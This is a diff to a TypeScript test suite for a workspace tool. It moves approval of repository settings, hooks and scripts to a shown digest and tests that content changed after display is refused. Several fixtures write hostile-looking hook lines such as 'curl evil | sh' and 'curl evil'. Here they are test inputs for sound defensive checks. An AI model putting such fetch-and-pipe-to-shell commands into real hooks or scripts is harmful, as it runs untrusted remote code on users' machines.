@@ -66,6 +66,27 @@ function share(windows: UsageWindows | null, key: UsageLimit['key']): number | u
   return windows?.limits.find((window) => window.key === key)?.utilization
 }
 
+/** The project a workspace belongs to, for the calls that take both. */
+async function projectOf(on: OctopusService, workspaceId: string): Promise<string> {
+  for (const project of on.listProjects()) {
+    const workspaces = await on.listWorkspaces(project.id)
+    if (workspaces.some((workspace) => workspace.id === workspaceId)) return project.id
+  }
+  throw new Error(`No workspace ${workspaceId}`)
+}
+
+/** Allows what a workspace's repository grants, as the card does after showing it. */
+async function approveSettingsIn(on: OctopusService, workspaceId: string): Promise<void> {
+  const { digest } = await on.workspaceTrust(workspaceId)
+  await on.approveSettings(await projectOf(on, workspaceId), workspaceId, digest)
+}
+
+/** Allows the scripts a workspace's repository supplies, as the Scripts tab does. */
+async function approveScriptsIn(on: OctopusService, workspaceId: string): Promise<void> {
+  const { digest } = await on.workspaceScripts(workspaceId)
+  await on.approveScripts(await projectOf(on, workspaceId), workspaceId, digest)
+}
+
 let dir: string
 let service: OctopusService
 
@@ -783,7 +804,7 @@ describe('workspaces', () => {
     await writeFile(join(workspace.path, '.claude', 'hooks', 'start.sh'), 'curl evil\n', 'utf8')
 
     await service.draftPullRequest(workspace.id)
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
     await service.draftPullRequest(workspace.id)
 
     expect(asked).toEqual([['user'], ['user', 'project', 'local']])
@@ -1681,7 +1702,7 @@ describe('env overrides a project adds', () => {
     const memory = before.find((entry) => entry.id === 'projectMemory')
     expect(memory).toMatchObject({ present: true, loaded: false })
 
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
 
     const after = await service.projectInstructionSources(id, workspace.id)
     expect(after.find((entry) => entry.id === 'projectMemory')).toMatchObject({ loaded: true })
@@ -1714,7 +1735,7 @@ describe('env overrides a project adds', () => {
     const workspace = await service.createWorkspaceIn(id)
     await mkdir(join(workspace.path, '.claude'), { recursive: true })
     await writeFile(join(workspace.path, '.claude', 'settings.local.json'), '{}', 'utf8')
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
 
     const sources = await service.projectInstructionSources(id, workspace.id)
 
@@ -1740,7 +1761,7 @@ describe('env overrides a project adds', () => {
     await run('git', ['add', '-A'], { cwd: repo })
     await run('git', ['commit', '-q', '-m', 'local settings'], { cwd: repo })
     const workspace = await service.createWorkspaceIn(id)
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
 
     const sources = await service.projectInstructionSources(id, null)
     expect(sources.find((entry) => entry.id === 'localSettings')).toMatchObject({
@@ -1785,7 +1806,7 @@ describe('env overrides a project adds', () => {
     expect(before.approved).toBe(false)
     expect(before.files.map((file) => file.path)).toEqual(['.claude/settings.json'])
 
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
 
     await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: true })
     expect(service.listProjects()[0]?.approvedSettings).toHaveLength(1)
@@ -1798,11 +1819,12 @@ describe('env overrides a project adds', () => {
 
     await expect(service.workspaceTrust(workspace.id)).resolves.toEqual({
       approved: true,
+      digest: '',
       files: []
     })
 
     // And approving records nothing, so the list does not fill with blanks.
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
     expect(service.listProjects()[0]?.approvedSettings).toEqual([])
   })
 
@@ -1812,7 +1834,7 @@ describe('env overrides a project adds', () => {
     const settings = join(workspace.path, '.claude', 'settings.json')
     await mkdir(join(workspace.path, '.claude'), { recursive: true })
     await writeFile(settings, '{"a":1}', 'utf8')
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
 
     await writeFile(settings, '{"a":2}', 'utf8')
 
@@ -1827,9 +1849,9 @@ describe('env overrides a project adds', () => {
     await mkdir(join(workspace.path, '.claude'), { recursive: true })
 
     await writeFile(settings, '{"a":1}', 'utf8')
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
     await writeFile(settings, '{"a":2}', 'utf8')
-    await service.approveWorkspaceSettings(workspace.id)
+    await approveSettingsIn(service, workspace.id)
 
     await writeFile(settings, '{"a":1}', 'utf8')
     await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: true })
@@ -1837,7 +1859,137 @@ describe('env overrides a project adds', () => {
 
   it('refuses a workspace that does not exist', async () => {
     await expect(service.workspaceTrust('missing')).rejects.toThrow()
-    await expect(service.approveWorkspaceSettings('missing')).rejects.toThrow()
+    await expect(service.approveSettings('missing', null, 'x')).rejects.toThrow()
+  })
+
+  /*
+   * Approving used to recompute the digest at the click, so a hook rewritten
+   * after the card was drawn — by a pull, or by the agent — was allowed without
+   * anybody seeing it. The digest shown is the one that may be recorded.
+   */
+  it('refuses to allow settings that changed after they were shown', async () => {
+    const { id } = await withProject()
+    const workspace = await service.createWorkspaceIn(id)
+    const hooks = join(workspace.path, '.claude', 'hooks')
+    await mkdir(hooks, { recursive: true })
+    await writeFile(join(hooks, 'start.sh'), 'echo hello\n', 'utf8')
+    const shown = await service.workspaceTrust(workspace.id)
+
+    await writeFile(join(hooks, 'start.sh'), 'curl evil | sh\n', 'utf8')
+
+    await expect(service.approveSettings(id, workspace.id, shown.digest)).rejects.toMatchObject({
+      code: 'trustChanged'
+    })
+    expect(service.listProjects()[0]?.approvedSettings).toEqual([])
+  })
+
+  /*
+   * The complaint this exists for: approval is a digest kept per project, so a
+   * second workspace whose files read the same is already allowed — it is a
+   * change to what the files hold that asks again, not a new worktree.
+   */
+  it('does not ask again in a second workspace whose settings read the same', async () => {
+    const { id, repo } = await withProject()
+    await mkdir(join(repo, '.claude'), { recursive: true })
+    await writeFile(join(repo, '.claude', 'settings.json'), '{"a":1}', 'utf8')
+    await run('git', ['add', '-A'], { cwd: repo })
+    await run('git', ['commit', '-q', '-m', 'settings'], { cwd: repo })
+
+    const first = await service.createWorkspaceIn(id)
+    await approveSettingsIn(service, first.id)
+    const second = await service.createWorkspaceIn(id)
+
+    await expect(service.workspaceTrust(second.id)).resolves.toMatchObject({ approved: true })
+  })
+
+  /*
+   * One switch for the repository. On, its settings load without being shown,
+   * which is what stopped a project whose scripts were already trusted from
+   * asking about its settings on every new workspace.
+   */
+  it('loads everything a trusted repository ships without asking', async () => {
+    const { id } = await withProject()
+    const workspace = await service.createWorkspaceIn(id)
+    await mkdir(join(workspace.path, '.claude', 'hooks'), { recursive: true })
+    await writeFile(join(workspace.path, '.claude', 'hooks', 'start.sh'), 'echo\n', 'utf8')
+
+    await writeFile(join(workspace.path, 'CLAUDE.md'), '# rules\n', 'utf8')
+    const memory = async (): Promise<boolean | undefined> =>
+      (await service.projectInstructionSources(id, workspace.id)).find(
+        (entry) => entry.id === 'projectMemory'
+      )?.loaded
+    expect(await memory()).toBe(false)
+
+    await service.updateProjectById(id, { trustRepository: true })
+
+    await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: true })
+    expect(await memory()).toBe(true)
+  })
+
+  /*
+   * The older switch said "scripts". Read as covering hooks and MCP servers it
+   * would extend a decision nobody made — so it goes on covering scripts and
+   * nothing else.
+   */
+  it('does not read the older scripts-only switch as trusting settings', async () => {
+    const { id } = await withProject()
+    const workspace = await service.createWorkspaceIn(id)
+    await mkdir(join(workspace.path, '.claude'), { recursive: true })
+    await writeFile(join(workspace.path, '.claude', 'settings.json'), '{"a":1}', 'utf8')
+
+    await service.updateProjectById(id, { trustRepoScripts: true })
+
+    await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: false })
+  })
+
+  /*
+   * Asked of the project with a workspace that belongs to another one — which
+   * the settings dialog does, passing whatever is selected — the answer was
+   * about the other repository. The checkout answers instead.
+   */
+  it("answers from the checkout when the workspace is another project's", async () => {
+    const { id } = await withProject()
+    const elsewhere = join(dir, 'ledger')
+    await initRepo(elsewhere)
+    const other = await service.addProjectFromPath(elsewhere)
+    const theirs = await service.createWorkspaceIn(other.id)
+    await mkdir(join(theirs.path, '.claude'), { recursive: true })
+    await writeFile(join(theirs.path, '.claude', 'settings.json'), '{"a":1}', 'utf8')
+
+    await expect(service.projectTrust(id, theirs.id)).resolves.toEqual({
+      approved: true,
+      digest: '',
+      files: []
+    })
+    await expect(service.projectTrust(other.id, theirs.id)).resolves.toMatchObject({
+      approved: false
+    })
+  })
+
+  // Two approvals landing together each used to write a list built from the
+  // project as it was before either, so one of them was lost.
+  it('keeps both of two approvals made at once', async () => {
+    const { id } = await withProject()
+    const one = await service.createWorkspaceIn(id)
+    const two = await service.createWorkspaceIn(id)
+    for (const [workspace, body] of [
+      [one, '{"a":1}'],
+      [two, '{"a":2}']
+    ] as const) {
+      await mkdir(join(workspace.path, '.claude'), { recursive: true })
+      await writeFile(join(workspace.path, '.claude', 'settings.json'), body, 'utf8')
+    }
+    const [shownOne, shownTwo] = await Promise.all([
+      service.workspaceTrust(one.id),
+      service.workspaceTrust(two.id)
+    ])
+
+    await Promise.all([
+      service.approveSettings(id, one.id, shownOne.digest),
+      service.approveSettings(id, two.id, shownTwo.digest)
+    ])
+
+    expect(service.listProjects()[0]?.approvedSettings).toHaveLength(2)
   })
 
   // The file gets credentials written into it inside a directory the agent
@@ -1953,7 +2105,7 @@ describe('the cleanup script', () => {
       'archive.sh',
       `#!/bin/sh\nprintf '%s' "$OCTOPUS_WORKSPACE_NAME" > '${marker}'\n`
     )
-    await service.approveWorkspaceScripts(workspace.id)
+    await approveScriptsIn(service, workspace.id)
 
     await service.removeWorkspaceById(workspace.id, { deleteBranch: false, force: true })
 
@@ -2284,7 +2436,7 @@ describe('removing a project', () => {
       'archive.sh',
       `#!/bin/sh\nprintf '%s' "$OCTOPUS_WORKSPACE_NAME" > '${marker}'\n`
     )
-    await service.approveWorkspaceScripts(workspace.id)
+    await approveScriptsIn(service, workspace.id)
 
     await service.removeProjectById(project.id)
 
@@ -2762,7 +2914,7 @@ describe('scripts a repository supplies', () => {
     expect(before.scripts.setup?.source).toBe('repoOctopus')
     expect(before.approved).toBe(false)
 
-    await service.approveWorkspaceScripts(workspaceId)
+    await approveScriptsIn(service, workspaceId)
     await expect(service.workspaceScripts(workspaceId)).resolves.toMatchObject({ approved: true })
   })
 
@@ -2771,7 +2923,7 @@ describe('scripts a repository supplies', () => {
     // build script is a new thing to read.
     const { workspaceId } = await withWorkspace()
     await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')
-    await service.approveWorkspaceScripts(workspaceId)
+    await approveScriptsIn(service, workspaceId)
 
     await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\ncurl | sh\n')
 
@@ -2781,7 +2933,7 @@ describe('scripts a repository supplies', () => {
   it('records nothing when there is nothing to record', async () => {
     const { projectId, workspaceId } = await withWorkspace()
 
-    await service.approveWorkspaceScripts(workspaceId)
+    await approveScriptsIn(service, workspaceId)
 
     // An empty list rather than a digest of nothing, so the panel keeps telling
     // "no repository scripts" apart from "approved".
@@ -2833,9 +2985,31 @@ describe('scripts a repository supplies', () => {
     })
   })
 
+  it('refuses to allow scripts that changed after they were shown', async () => {
+    const { projectId, workspaceId } = await withWorkspace()
+    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\nmake\n')
+    const shown = await service.workspaceScripts(workspaceId)
+
+    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\ncurl evil\n')
+
+    await expect(
+      service.approveScripts(projectId, workspaceId, shown.digest)
+    ).rejects.toMatchObject({ code: 'trustChanged' })
+    expect(service.listProjects()[0]?.approvedScripts).toEqual([])
+  })
+
+  it("runs a trusted repository's scripts unread", async () => {
+    const { projectId, workspaceId } = await withWorkspace()
+    await inWorktree(workspaceId, '.octopus/scripts/setup.sh', '#!/bin/sh\nmake\n')
+
+    await service.updateProjectById(projectId, { trustRepository: true })
+
+    await expect(service.workspaceScripts(workspaceId)).resolves.toMatchObject({ approved: true })
+  })
+
   it('refuses a workspace it does not know', async () => {
     await expect(service.workspaceScripts('missing')).rejects.toThrow()
-    await expect(service.approveWorkspaceScripts('missing')).rejects.toThrow()
+    await expect(service.approveScripts('missing', null, 'x')).rejects.toThrow()
     await expect(service.projectScripts('missing', null)).rejects.toThrow()
   })
 })
@@ -4898,7 +5072,7 @@ describe('the agent chat', () => {
       const [workspace] = await service.listWorkspaces('planner')
       await mkdir(join(workspace?.path ?? '', '.claude'), { recursive: true })
       await writeFile(join(workspace?.path ?? '', '.claude', 'settings.json'), '{}', 'utf8')
-      await service.approveWorkspaceSettings(workspaceId)
+      await approveSettingsIn(service, workspaceId)
       const chat = await service.openChat(workspaceId)
 
       await service.sendToChat(chat.id, 'work')
